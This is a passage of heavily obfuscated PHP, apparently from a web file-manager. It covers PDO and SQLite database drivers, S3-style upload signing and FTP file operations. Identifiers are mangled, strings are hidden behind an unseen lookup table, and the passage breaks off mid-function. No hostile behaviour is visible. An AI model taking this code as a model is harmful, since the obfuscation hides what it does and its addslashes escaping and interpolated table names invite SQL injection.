(preg_match($°Ãß´Úë[963], $this->queryStr, $Ïöı„Åã)) { $this->table = think_config($°Ãß´Úë[964]) . str_ireplace(think_config($°Ãß´Úë[965]), $°Ãß´Úë[424], $Ïöı„Åã[2]); $È¦Ú’ŸÒ = (bool) $this->query($°Ãß´Úë[966] . strtoupper($this->table) . $°Ãß´Úë[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($°Ãß´Úë[25], 1); think_status($°Ãß´Úë[24]); $this->PDOStatement = $this->_linkID->prepare($İóÔ½­ü); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Şìü×¯“ = $this->PDOStatement->execute($ó…ŞãÛŒ); $this->debug(); if (!1 === $Şìü×¯“) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($È¦Ú’ŸÒ || preg_match($°Ãß´Úë[967], $İóÔ½­ü)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…ñ—»¶Ç = $this->_linkID->commit(); $this->transTimes = 0; if (!$…ñ—»¶Ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Øı£´Šƒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Øı£´Šƒ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ş±Òüø = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ş±Òüø); return $Ş±Òüø; } public function getFields($´ßãâû²) { $Ò‹ƒ„¨” =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (think_config($Ò‹ƒ„¨”[968])) { $ì´’³¨ü = str_replace($Ò‹ƒ„¨”[969], $´ßãâû², think_config($Ò‹ƒ„¨”[968])); } else { switch ($this->dbType) { case $Ò‹ƒ„¨”[952]: case $Ò‹ƒ„¨”[970]: $ì´’³¨ü = "\x53\x45\x4c\x45\x43\124\x20\40\x20\x63\x6f\x6c\x75\x6d\156\x5f\x6e\x61\155\145\x20\x61\x73\40\47\x4e\x61\x6d\145\x27\x2c\x20\40\x20\x64\x61\164\x61\x5f\x74\x79\160\x65\40\x61\x73\40\x27\x54\171\x70\145\x27\x2c\40\x20\40\143\x6f\154\x75\155\x6e\x5f\144\145\146\x61\x75\x6c\x74\40\x61\163\40\x27\104\145\x66\141\165\154\164\47\54\x20\40\x20\x69\163\x5f\156\165\154\x6c\x61\142\154\x65\40\x61\x73\x20\47\116\165\154\154\47\12\11\11\x46\122\117\x4d\x9\x69\156\x66\157\x72\x6d\x61\x74\151\157\156\x5f\x73\x63\x68\145\x6d\x61\x2e\x74\x61\x62\x6c\x65\x73\x20\101\x53\x20\x74\xa\x9\11\112\117\111\x4e\11\151\156\x66\157\162\155\x61\164\151\x6f\156\137\x73\143\x68\x65\x6d\x61\x2e\x63\157\x6c\165\x6d\156\163\40\101\123\x20\143\12\11\11\x4f\116\x20\x20\164\x2e\164\141\x62\x6c\x65\137\143\141\x74\x61\154\x6f\147\40\x3d\40\x63\56\164\x61\x62\x6c\145\x5f\143\x61\164\141\x6c\x6f\147\xa\x9\11\x41\116\104\40\x74\56\x74\x61\142\154\145\x5f\163\143\150\145\155\141\40\75\x20\x63\x2e\164\x61\x62\x6c\145\x5f\163\143\150\145\155\x61\12\x9\11\x41\116\104\40\x74\56\x74\x61\x62\154\x65\x5f\x6e\141\155\x65\40\75\x20\x63\56\164\141\x62\x6c\x65\137\156\141\x6d\145\12\x9\x9\127\110\x45\x52\x45\x20\x20\x20\x74\x2e\x74\x61\x62\154\x65\137\156\x61\155\x65\40\75\x20\47{$´ßãâû²}\47"; break; case $Ò‹ƒ„¨”[971]: $ì´’³¨ü = $Ò‹ƒ„¨”[972] . $´ßãâû² . $Ò‹ƒ„¨”[973]; break; case $Ò‹ƒ„¨”[953]: case $Ò‹ƒ„¨”[955]: $ì´’³¨ü = $Ò‹ƒ„¨”[974] . $Ò‹ƒ„¨”[975] . $Ò‹ƒ„¨”[976] . strtoupper($´ßãâû²) . $Ò‹ƒ„¨”[977] . strtoupper($´ßãâû²) . $Ò‹ƒ„¨”[978]; break; case $Ò‹ƒ„¨”[979]: $ì´’³¨ü = $Ò‹ƒ„¨”[980] . $´ßãâû² . $Ò‹ƒ„¨”[981]; break; case $Ò‹ƒ„¨”[954]: break; case $Ò‹ƒ„¨”[982]: default: $ì´’³¨ü = $Ò‹ƒ„¨”[983] . ($this->dbType == $Ò‹ƒ„¨”[982] ? "\140{$´ßãâû²}\x60" : $´ßãâû²); } } $şÇ­É¹¢ = $this->query($ì´’³¨ü); $¿Ş³¦€÷ = array(); if ($şÇ­É¹¢) { foreach ($şÇ­É¹¢ as $‹àºô => $À§¡©‰) { $À§¡©‰ = array_change_key_case($À§¡©‰); $À§¡©‰[$Ò‹ƒ„¨”[32]] = isset($À§¡©‰[$Ò‹ƒ„¨”[32]]) ? $À§¡©‰[$Ò‹ƒ„¨”[32]] : $Ò‹ƒ„¨”[424]; $À§¡©‰[$Ò‹ƒ„¨”[33]] = isset($À§¡©‰[$Ò‹ƒ„¨”[33]]) ? $À§¡©‰[$Ò‹ƒ„¨”[33]] : $Ò‹ƒ„¨”[424]; $ìğ¦×—Î = isset($À§¡©‰[$Ò‹ƒ„¨”[319]]) ? $À§¡©‰[$Ò‹ƒ„¨”[319]] : $À§¡©‰[$Ò‹ƒ„¨”[32]]; $¿Ş³¦€÷[$ìğ¦×—Î] = array($Ò‹ƒ„¨”[32] => $ìğ¦×—Î, $Ò‹ƒ„¨”[33] => $À§¡©‰[$Ò‹ƒ„¨”[33]], $Ò‹ƒ„¨”[35] => (bool) (isset($À§¡©‰[$Ò‹ƒ„¨”[105]]) && $À§¡©‰[$Ò‹ƒ„¨”[105]] === $Ò‹ƒ„¨”[12] || isset($À§¡©‰[$Ò‹ƒ„¨”[35]]) && $À§¡©‰[$Ò‹ƒ„¨”[35]] === $Ò‹ƒ„¨”[12]), $Ò‹ƒ„¨”[37] => isset($À§¡©‰[$Ò‹ƒ„¨”[37]]) ? $À§¡©‰[$Ò‹ƒ„¨”[37]] : (isset($À§¡©‰[$Ò‹ƒ„¨”[56]]) ? $À§¡©‰[$Ò‹ƒ„¨”[56]] : $Ò‹ƒ„¨”[424]), $Ò‹ƒ„¨”[39] => isset($À§¡©‰[$Ò‹ƒ„¨”[96]]) ? strtolower($À§¡©‰[$Ò‹ƒ„¨”[96]]) == $Ò‹ƒ„¨”[41] : (isset($À§¡©‰[$Ò‹ƒ„¨”[57]]) ? $À§¡©‰[$Ò‹ƒ„¨”[57]] : !1), $Ò‹ƒ„¨”[42] => isset($À§¡©‰[$Ò‹ƒ„¨”[984]]) ? strtolower($À§¡©‰[$Ò‹ƒ„¨”[984]]) == $Ò‹ƒ„¨”[44] : (isset($À§¡©‰[$Ò‹ƒ„¨”[96]]) ? $À§¡©‰[$Ò‹ƒ„¨”[96]] : !1)); } } return $¿Ş³¦€÷; } public function getTables($¦œ¾ñÍ  = '') { $„ç±Ù»¶ =& $_SERVER[ ÇƒŠìÀ]; if (think_config($„ç±Ù»¶[985])) { $Üö‰©ı = str_replace($„ç±Ù»¶[986], $¦œ¾ñÍ , think_config($„ç±Ù»¶[985])); } else { switch ($this->dbType) { case $„ç±Ù»¶[953]: case $„ç±Ù»¶[955]: $Üö‰©ı = $„ç±Ù»¶[987]; break; case $„ç±Ù»¶[952]: case $„ç±Ù»¶[970]: $Üö‰©ı = $„ç±Ù»¶[988]; break; case $„ç±Ù»¶[979]: $Üö‰©ı = $„ç±Ù»¶[989]; break; case $„ç±Ù»¶[954]: think_exception(think_lang($„ç±Ù»¶[990]) . $„ç±Ù»¶[991]); break; case $„ç±Ù»¶[971]: $Üö‰©ı = $„ç±Ù»¶[45] . $„ç±Ù»¶[46] . $„ç±Ù»¶[47]; break; case $„ç±Ù»¶[982]: default: if (!empty($¦œ¾ñÍ )) { $Üö‰©ı = $„ç±Ù»¶[932] . $¦œ¾ñÍ  . $„ç±Ù»¶[933]; } else { $Üö‰©ı = $„ç±Ù»¶[934]; } } } $§©…ÓĞĞ = $this->query($Üö‰©ı); $²üÍÃšı = array(); foreach ($§©…ÓĞĞ as $†ìÉ­ğù => $Œ§Ì¡ÀÎ) { $²üÍÃšı[$†ìÉ­ğù] = current($Œ§Ì¡ÀÎ); } return $²üÍÃšı; } protected function parseLimit($Ö§ñšüü) { $ÕŞ¦¨Ø­ =& $_SERVER[ ÇƒŠìÀ]; $¹î ßİ° = $ÕŞ¦¨Ø­[12]; if (!empty($Ö§ñšüü)) { switch ($this->dbType) { case $ÕŞ¦¨Ø­[979]: case $ÕŞ¦¨Ø­[971]: $Ö§ñšüü = explode($ÕŞ¦¨Ø­[50], $Ö§ñšüü); if (count($Ö§ñšüü) > 1) { $¹î ßİ° .= $ÕŞ¦¨Ø­[51] . $Ö§ñšüü[1] . $ÕŞ¦¨Ø­[52] . $Ö§ñšüü[0] . $ÕŞ¦¨Ø­[53]; } else { $¹î ßİ° .= $ÕŞ¦¨Ø­[51] . $Ö§ñšüü[0] . $ÕŞ¦¨Ø­[53]; } break; case $ÕŞ¦¨Ø­[952]: case $ÕŞ¦¨Ø­[970]: break; case $ÕŞ¦¨Ø­[954]: break; case $ÕŞ¦¨Ø­[953]: case $ÕŞ¦¨Ø­[955]: break; case $ÕŞ¦¨Ø­[982]: default: $¹î ßİ° .= $ÕŞ¦¨Ø­[51] . $Ö§ñšüü . $ÕŞ¦¨Ø­[53]; } } return $¹î ßİ°; } public function parseKey(&$Î§ìÓ‡, $ì¿Ã‡ = true) { $ÁØ„…è =& $_SERVER[ ÇƒŠìÀ]; if ($ì¿Ã‡) { $Î§ìÓ‡ = $this->parseKeyCheck($Î§ìÓ‡); } if ($this->dbType == $ÁØ„…è[982]) { if ($Î§ìÓ‡ != $ÁØ„…è[205] && !preg_match($ÁØ„…è[944], $Î§ìÓ‡)) { $Î§ìÓ‡ = $ÁØ„…è[431] . trim($Î§ìÓ‡, $ÁØ„…è[431]) . $ÁØ„…è[431]; } return $Î§ìÓ‡; } else { return parent::parseKey($Î§ìÓ‡, $ì¿Ã‡); } } public function close() { $this->_linkID = null; } public function error() { $ÚÖíÀŞ† =& $_SERVER[ ÇƒŠìÀ]; if ($this->PDOStatement) { $ÈÁ¯É—¬ = $this->PDOStatement->errorInfo(); $this->error = $ÈÁ¯É—¬[1] . $ÚÖíÀŞ†[4] . $ÈÁ¯É—¬[2]; } else { $this->error = $ÚÖíÀŞ†[12]; } if ($ÚÖíÀŞ†[12] != $this->queryStr) { $this->error .= LNG($ÚÖíÀŞ†[48]) . $this->queryStr; } think_trace($this->error, $ÚÖíÀŞ†[12], $ÚÖíÀŞ†[49]); return $this->error; } public function escapeString($ÙË»—§”) { $É‹‰©€º =& $_SERVER[ ÇƒŠìÀ]; switch ($this->dbType) { case $É‹‰©€º[979]: case $É‹‰©€º[952]: case $É‹‰©€º[970]: case $É‹‰©€º[982]: return addslashes($ÙË»—§”); case $É‹‰©€º[954]: case $É‹‰©€º[971]: case $É‹‰©€º[953]: case $É‹‰©€º[955]: return str_ireplace($É‹‰©€º[58], $É‹‰©€º[59], $ÙË»—§”); } } protected function parseValue($û¦›£§í) { $ĞáÛÕò™ =& $_SERVER[ ÇƒŠìÀ]; if (is_string($û¦›£§í)) { $ëÌ›¥ = strpos($û¦›£§í, $ĞáÛÕò™[4]) === 0 && in_array($û¦›£§í, array_keys($this->bind)); $û¦›£§í = $ëÌ›¥ ? $this->escapeString($û¦›£§í) : $ĞáÛÕò™[992] . $this->escapeString($û¦›£§í) . $ĞáÛÕò™[992]; } elseif (isset($û¦›£§í[0]) && is_string($û¦›£§í[0]) && strtolower($û¦›£§í[0]) == $ĞáÛÕò™[343]) { $û¦›£§í = $this->escapeString($û¦›£§í[1]); } elseif (is_array($û¦›£§í)) { $û¦›£§í = array_map(array($this, $ĞáÛÕò™[993]), $û¦›£§í); } elseif (is_bool($û¦›£§í)) { $û¦›£§í = $û¦›£§í ? $ĞáÛÕò™[90] : $ĞáÛÕò™[214]; } elseif (is_null($û¦›£§í)) { $û¦›£§í = $ĞáÛÕò™[105]; } return $û¦›£§í; } public function getLastInsertId() { $¯œ„ı½  =& $_SERVER[ ÇƒŠìÀ]; switch ($this->dbType) { case $¯œ„ı½ [979]: case $¯œ„ı½ [971]: case $¯œ„ı½ [952]: case $¯œ„ı½ [970]: case $¯œ„ı½ [954]: case $¯œ„ı½ [982]: return $this->_linkID->lastInsertId(); case $¯œ„ı½ [953]: case $¯œ„ı½ [955]: $•ú‚°Œ‘ = $this->table; $¦×î¥ÒŒ = $this->query("\123\x45\x4c\105\x43\x54\40{$•ú‚°Œ‘}\56\x63\x75\x72\x72\166\141\154\40\x63\x75\162\162\166\x61\x6c\x20\x46\x52\x4f\115\x20\144\165\141\154"); return $¦×î¥ÒŒ ? $¦×î¥ÒŒ[0][$¯œ„ı½ [994]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Œïù˜ˆ¡) { $Œ÷íÛ€ =& $_SERVER[ ÇƒŠìÀ]; if (!CacheLock::fileLock($Œ÷íÛ€[13])) { return !1; } $÷†¸æ–Õ = parent::query($Œïù˜ˆ¡); CacheLock::fileUnLock($Œ÷íÛ€[13]); return $÷†¸æ–Õ; } public function execute($©Ù¹å›Ã) { $‹˜ÉŞ© =& $_SERVER[ ÇƒŠìÀ]; if (!CacheLock::fileLock($‹˜ÉŞ©[13])) { return !1; } $˜‹¢æ¨ = parent::execute($©Ù¹å›Ã); CacheLock::fileUnLock($‹˜ÉŞ©[13]); return $˜‹¢æ¨; } } class DbSqlite3 extends DbSqlite3Base { public function query($˜ıô¹ØÇ) { $ß¢Ø«Š =& $_SERVER[ ÇƒŠìÀ]; if (!CacheLock::fileLock($ß¢Ø«Š[13])) { return !1; } $ìãØæ‚Ü = parent::query($˜ıô¹ØÇ); CacheLock::fileUnLock($ß¢Ø«Š[13]); return $ìãØæ‚Ü; } public function execute($»Ø¢ã…±) { $ãæÒ‰Í¡ =& $_SERVER[ ÇƒŠìÀ]; if (!CacheLock::fileLock($ãæÒ‰Í¡[13])) { return !1; } $ ï¬‹Ìä = parent::execute($»Ø¢ã…±); CacheLock::fileUnLock($ãæÒ‰Í¡[13]); return $ ï¬‹Ìä; } } goto C­¯ËÛŒÏÜ; e•‹¥„¿¹‹: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÄâÃï”®) { parent::__construct($ÄâÃï”®); $this->signatureVersion($_SERVER[ ÇƒŠìÀ][233]); } public function uploadFormData($Ü‡¦üÀ¿, $«æ¸ÌÜ· = 3600) { $¢¿ç‹õ† =& $_SERVER[ ÇƒŠìÀ]; $¼Æé“Å = $¢¿ç‹õ†[215]; $Õ§•ûå = $¢¿ç‹õ†[255]; $½Ä™È˜• = $¢¿ç‹õ†[62]; $œ€É• = gmdate($¢¿ç‹õ†[256]); $»ù¨Ü‡ = gmdate($¢¿ç‹õ†[257]); $²çä”Âñ = $¢¿ç‹õ†[258]; $‡«ˆôƒ = $«æ¸ÌÜ· . $¢¿ç‹õ†[12]; $¤æè˜ãè = $¢¿ç‹õ†[259]; $Ö¸®©–Ğ = array($this->accessKey, $»ù¨Ü‡, $this->region, $½Ä™È˜•, $²çä”Âñ); $ÆôıÇÎÉ = implode($¢¿ç‹õ†[8], $Ö¸®©–Ğ); $¯—àÒ«Ï = array($¢¿ç‹õ†[260] => gmdate($¢¿ç‹õ†[1360], strtotime($¢¿ç‹õ†[262])), $¢¿ç‹õ†[263] => array(array($¢¿ç‹õ†[264] => $this->bucket), array($¢¿ç‹õ†[265] => $¼Æé“Å), array($¢¿ç‹õ†[266], $¢¿ç‹õ†[267], $¢¿ç‹õ†[12]), array($¢¿ç‹õ†[266], $¢¿ç‹õ†[268], $¢¿ç‹õ†[12]), array($¢¿ç‹õ†[266], $¢¿ç‹õ†[269], $¢¿ç‹õ†[12]), array($¢¿ç‹õ†[270] => $¤æè˜ãè), array($¢¿ç‹õ†[271] => $ÆôıÇÎÉ), array($¢¿ç‹õ†[272] => $Õ§•ûå), array($¢¿ç‹õ†[273] => $œ€É•), array($¢¿ç‹õ†[274] => $‡«ˆôƒ))); $İ¦îñªÅ = base64_encode(json_encode($¯—àÒ«Ï)); $ûá‰ÄÊü = hash_hmac($¢¿ç‹õ†[275], $»ù¨Ü‡, $¢¿ç‹õ†[276] . $this->secret, !0); $æı·ğóÕ = hash_hmac($¢¿ç‹õ†[275], $this->region, $ûá‰ÄÊü, !0); $³İâ…ğà = hash_hmac($¢¿ç‹õ†[275], $½Ä™È˜•, $æı·ğóÕ, !0); $øÛ¶ª† = hash_hmac($¢¿ç‹õ†[275], $²çä”Âñ, $³İâ…ğà, !0); $àÖãËğ = hash_hmac($¢¿ç‹õ†[275], $İ¦îñªÅ, $øÛ¶ª†); $áğÀî¬Ğ = array($¢¿ç‹õ†[232] => $¢¿ç‹õ†[12], $¢¿ç‹õ†[277] => $¢¿ç‹õ†[12], $¢¿ç‹õ†[265] => $¼Æé“Å, $¢¿ç‹õ†[270] => $¤æè˜ãè, $¢¿ç‹õ†[278] => $İ¦îñªÅ, $¢¿ç‹õ†[279] => $ÆôıÇÎÉ, $¢¿ç‹õ†[280] => $Õ§•ûå, $¢¿ç‹õ†[281] => $œ€É•, $¢¿ç‹õ†[282] => $‡«ˆôƒ, $¢¿ç‹õ†[283] => $àÖãËğ, $¢¿ç‹õ†[198] => $this->getHost()); return $áğÀî¬Ğ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($âêÅì‹€) { parent::__construct(); if (count($âêÅì‹€) > 0) { $this->_init($âêÅì‹€); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Å®›ûÀÇ) { $“öÙ°İŠ =& $_SERVER[ ÇƒŠìÀ]; global $config; $this->appCharset = $config[$“öÙ°İŠ[1386]]; $this->systemCharset = $config[$“öÙ°İŠ[1387]]; if (isset($Å®›ûÀÇ[$“öÙ°İŠ[1388]]) && $Å®›ûÀÇ[$“öÙ°İŠ[1388]]) { $this->systemCharset = $Å®›ûÀÇ[$“öÙ°İŠ[1388]]; } } public function iconvApp($¤Ïúíòï) { return $this->iconvTo($¤Ïúíòï, $this->systemCharset, $this->appCharset); } public function iconvSystem($Çò˜Åà±) { return $this->iconvTo($Çò˜Åà±, $this->appCharset, $this->systemCharset); } public function getPathOuter($¢ÑïºôÏ) { $Ëğíš­ì =& $_SERVER[ ÇƒŠìÀ]; $¸·æ¡™• = $this->iconvApp($this->pathBase); $¢ÑïºôÏ = $this->iconvApp($¢ÑïºôÏ); if (substr($¸·æ¡™•, 0, 2) == $Ëğíš­ì[1389]) { $¸·æ¡™• = BASIC_PATH . substr($¸·æ¡™•, 2); } if (substr($¢ÑïºôÏ, 0, 2) == $Ëğíš­ì[1389]) { $¢ÑïºôÏ = BASIC_PATH . substr($¢ÑïºôÏ, 2); } $¸·æ¡™• = KodIO::clear($¸·æ¡™•); $¢ÑïºôÏ = KodIO::clear($¢ÑïºôÏ); $¢ÑïºôÏ = substr($¢ÑïºôÏ, strlen($¸·æ¡™•)); if (empty($this->pathDriver)) { return $¢ÑïºôÏ; } return $this->pathDriver . $Ëğíš­ì[8] . ltrim($¢ÑïºôÏ, $Ëğíš­ì[8]); } private function _init($ë‚ÕÁÍê = array()) { $Õ²•®¦ =& $_SERVER[ ÇƒŠìÀ]; if (!function_exists($Õ²•®¦[1390])) { throw new Exception(LNG($Õ²•®¦[1391])); } $this->config = $ë‚ÕÁÍê; $this->charsetReset($ë‚ÕÁÍê); foreach ($ë‚ÕÁÍê as $äú¹ÆØ => $ÂèÈÚ°«) { if (isset($this->{$äú¹ÆØ})) { $this->{$äú¹ÆØ} = $ÂèÈÚ°«; } } return $this->_login($ë‚ÕÁÍê); } private function _login($öÀîÛÆÀ) { $×à„™êï =& $_SERVER[ ÇƒŠìÀ]; static $È´Áğšë = array(); $Ş…Ç—À = md5(json_encode($öÀîÛÆÀ)); if (isset($È´Áğšë[$Ş…Ç—À])) { foreach ($È´Áğšë[$Ş…Ç—À] as $¦”õ—‹® => $‘äİ”¼ë) { $this->{$¦”õ—‹®} = $‘äİ”¼ë; } return !0; } $†€ëººæ = parse_url(trim($this->server, $×à„™êï[8])); $this->host = $†€ëººæ[$×à„™êï[198]]; $·›¥æœË = isset($†€ëººæ[$×à„™êï[197]]) && $†€ëººæ[$×à„™êï[197]] == $×à„™êï[1392] ? !0 : !1; $this->scheme = $·›¥æœË ? $×à„™êï[1393] : $×à„™êï[1394]; $this->port = isset($†€ëººæ[$×à„™êï[199]]) ? $†€ëººæ[$×à„™êï[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $øš’¥¾§ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ü­Š’Ê… = $this->pasv == $×à„™êï[90] ? !0 : !1; @ftp_pasv($this->connect, $Ü­Š’Ê…); $È´Áğšë[$Ş…Ç—À] = array($×à„™êï[1395] => $this->connect, $×à„™êï[198] => $this->host, $×à„™êï[197] => $this->scheme, $×à„™êï[199] => $this->port); return $øš’¥¾§; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($‡Ìë•Ñ , $•«˜š¸® = '', $¹‚Úúö¾ = REPEAT_RENAME) { if ($this->setContent($‡Ìë•Ñ , $•«˜š¸®)) { return $this->getPathOuter($‡Ìë•Ñ ); } return !1; } public function mkdir($æ†ôÓáÑ, $ï•ş¬æä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $æ†ôÓáÑ = $this->iconvSystem($æ†ôÓáÑ); if ($this->_isFolder($æ†ôÓáÑ) || @ftp_mkdir($this->connect, $æ†ôÓáÑ)) { return $this->getPathOuter($æ†ôÓáÑ); } if (!$this->mkdir($this->pathFather($æ†ôÓáÑ))) { return !1; } if ($æ†ôÓáÑ = @ftp_mkdir($this->connect, $æ†ôÓáÑ)) { return $this->getPathOuter($æ†ôÓáÑ); } return !1; } public function copyFile($¹ï×‹„Œ, $ÌÉ•€¼») { if (!$this->_isconn()) { return !1; } $¿Á“Øäõ = $this->pathThis($this->iconvSystem($¹ï×‹„Œ)); $˜«³æ¤ = $this->tempFile($¿Á“Øäõ); $¢û‹íÈ° = $this->iconvApp($˜«³æ¤); $this->download($¹ï×‹„Œ, $¢û‹íÈ°); $Ÿòƒ²òÚ = $this->upload($ÌÉ•€¼», $¢û‹íÈ°); $this->tempFileRemve($˜«³æ¤); return $Ÿòƒ²òÚ; } public function moveFile($˜÷ÅâÎá, $ÛŠ¼ÜÃ·) { if (!$this->_isconn()) { return !1; } $˜÷ÅâÎá = $this->iconvSystem($˜÷ÅâÎá); $ÛŠ¼ÜÃ· = $this->iconvSystem($ÛŠ¼ÜÃ·); $±ü“ŸÇÜ = @ftp_rename($this->connect, $˜÷ÅâÎá, $ÛŠ¼ÜÃ·); return $±ü“ŸÇÜ ? $this->getPathOuter($ÛŠ¼ÜÃ·) : !1; } public function delFile($Â¡Ö÷åÎ) { if (!$this->_isconn()) { return !1; } $Â¡Ö÷åÎ = $this->iconvSystem($Â¡Ö÷åÎ); return @ftp_delete($this->connect, $Â¡Ö÷åÎ); } public function delFolder($÷µ•†üÎ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Â¶ğÇœ» = $ö»¡¸ç = array(); $this->fileList($÷µ•†üÎ, $Â¶ğÇœ», $ö»¡¸ç, !0); $this->listItemCache = !0; foreach ($ö»¡¸ç as $Ğ¦†äó‚) { $¨œÜä®Á = $this->iconvSystem($Ğ¦†äó‚[$_SERVER[ ÇƒŠìÀ][32]]); $‡ÒÆôá = @ftp_delete($this->connect, $¨œÜä®Á); if (!$‡ÒÆôá) { return !1; } } foreach ($Â¶ğÇœ» as $¨œÜä®Á) { $¨œÜä®Á = $this->iconvSystem($¨œÜä®Á); $‡ÒÆôá = @ftp_rmdir($this->connect, $¨œÜä®Á); if (!$‡ÒÆôá) { return !1; } } $÷µ•†üÎ = $this->iconvSystem($÷µ•†üÎ); return @ftp_rmdir($this->connect, $÷µ•†üÎ); } public function rename($Œ“ —™Á, $œœã‰â) { $Æƒºşçğ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->_isconn()) { return !1; } $õìê¿±Í = $this->fileNameAuto($this->pathFather($Œ“ —™Á), $œœã‰â); $õìê¿±Í = $this->iconvSystem($õìê¿±Í); $Œ“ —™Á = $this->iconvSystem($Œ“ —™Á); $ÁÚªá¿š = $this->pathFather($Œ“ —™Á); $†°•Äªš = rtrim($ÁÚªá¿š, $Æƒºşçğ[8]) . $Æƒºşçğ[8] . $õìê¿±Í; $½Æš¶–œ = @ftp_rename($this->connect, $Œ“ —™Á, $†°•Äªš); $†°•Äªš = $this->iconvApp($†°•Äªš); return $½Æš¶–œ ? $this->getPathOuter($†°•Äªš) : !1; } private function folderInfo($ç×îø±è, $îë„Âà§ = false) { $çÆàÑÚå =& $_SERVER[ ÇƒŠìÀ]; $¸¨½ö€ü = array($çÆàÑÚå[32] => $this->pathThis($ç×îø±è), $çÆàÑÚå[86] => $this->getPathOuter($çÆàÑÚå[8] . $ç×îø±è), $çÆàÑÚå[33] => $çÆàÑÚå[77]); if ($îë„Âà§) { return $¸¨½ö€ü; } $¸¨½ö€ü[$çÆàÑÚå[217]] = $¸¨½ö€ü[$çÆàÑÚå[87]] = 0; $¸¨½ö€ü[$çÆàÑÚå[218]] = $¸¨½ö€ü[$çÆàÑÚå[219]] = !0; return $¸¨½ö€ü; } private function fileInfo($×ğö£éÍ, $™²…ª” = false, $Œ„‘‹êì = array()) { $ôôŞ­¬“ =& $_SERVER[ ÇƒŠìÀ]; $¯Éµ¿  = array($ôôŞ­¬“[32] => $this->pathThis($×ğö£éÍ), $ôôŞ­¬“[86] => $this->getPathOuter($ôôŞ­¬“[8] . $×ğö£éÍ), $ôôŞ­¬“[33] => $ôôŞ­¬“[216], $ôôŞ­¬“[78] => isset($Œ„‘‹êì[$ôôŞ­¬“[78]]) ? $Œ„‘‹êì[$ôôŞ­¬“[78]] : 0, $ôôŞ­¬“[177] => $this->ext($×ğö£éÍ)); if ($™²…ª”) { return $¯Éµ¿ ; } $¯Éµ¿ [$ôôŞ­¬“[217]] = $¯Éµ¿ [$ôôŞ­¬“[87]] = 0; $¯Éµ¿ [$ôôŞ­¬“[218]] = $¯Éµ¿ [$ôôŞ­¬“[219]] = !0; $³É÷äú´ = $this->iconvSystem($×ğö£éÍ); $¯Éµ¿ [$ôôŞ­¬“[87]] = @ftp_mdtm($this->connect, $³É÷äú´); if (empty($Œ„‘‹êì)) { $Œ„‘‹êì = $this->objectMeta($×ğö£éÍ); if (!$Œ„‘‹êì) { return $¯Éµ¿ ; } } $¯Éµ¿ [$ôôŞ­¬“[78]] = $Œ„‘‹êì[$ôôŞ­¬“[78]]; return $¯Éµ¿ ; } public function size($æßîµ®â) { $İ’†¸‰Ò = $this->objectMeta($æßîµ®â); return $İ’†¸‰Ò ? $İ’†¸‰Ò[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function info($„ÔÌÙ×‘) { if ($this->isFile($„ÔÌÙ×‘)) { return $this->fileInfo($„ÔÌÙ×‘, 0); } else { if ($this->isFolder($„ÔÌÙ×‘)) { return $this->folderInfo($„ÔÌÙ×‘); } } return !1; } private function fileList($ü¿úÀ¢Ú, &$”ãÄğ, &$éêêè®Å, $ŠùğÃ™ = false) { $ŸÚ¹ñÃÚ =& $_SERVER[ ÇƒŠìÀ]; $ü¿úÀ¢Ú = $this->iconvSystem($ü¿úÀ¢Ú); if (!$this->isFolder($ü¿úÀ¢Ú)) { return !1; } @ftp_chdir($this->connect, $ŸÚ¹ñÃÚ[8]); $ü¿úÀ¢Ú = rtrim($ü¿úÀ¢Ú, $ŸÚ¹ñÃÚ[8]) . $ŸÚ¹ñÃÚ[8]; check_abort(); $´Ô—¬¤‰ = @ftp_rawlist($this->connect, $ü¿úÀ¢Ú); if (!$´Ô—¬¤‰) { $´Ô—¬¤‰ = array(); } $£î®«¦ë = array($ŸÚ¹ñÃÚ[10] => 1, $ŸÚ¹ñÃÚ[1313] => 1); foreach ($´Ô—¬¤‰ as $æıÈ•ô·) { $•˜åĞõ = $this->_listItem($æıÈ•ô·); if ($•˜åĞõ[0] == $ŸÚ¹ñÃÚ[787]) { continue; } $•½®È¿ı = $•˜åĞõ[8]; if (empty($•½®È¿ı) && $•½®È¿ı !== $ŸÚ¹ñÃÚ[214] || isset($£î®«¦ë[$•½®È¿ı])) { continue; } $•½®È¿ı = $this->iconvApp($ü¿úÀ¢Ú . ltrim($•½®È¿ı, $ŸÚ¹ñÃÚ[8])); $¡ñ– ôĞ = array($ŸÚ¹ñÃÚ[32] => $•½®È¿ı, $ŸÚ¹ñÃÚ[33] => $ŸÚ¹ñÃÚ[216], $ŸÚ¹ñÃÚ[78] => $•˜åĞõ[4]); if (substr($æıÈ•ô·, 0, 1) == $ŸÚ¹ñÃÚ[1396]) { $¡ñ– ôĞ[$ŸÚ¹ñÃÚ[33]] = $ŸÚ¹ñÃÚ[77]; $¡ñ– ôĞ[$ŸÚ¹ñÃÚ[78]] = 0; } $¤Øù¤å = $¡ñ– ôĞ[$ŸÚ¹ñÃÚ[33]] == $ŸÚ¹ñÃÚ[77] ? !0 : !1; 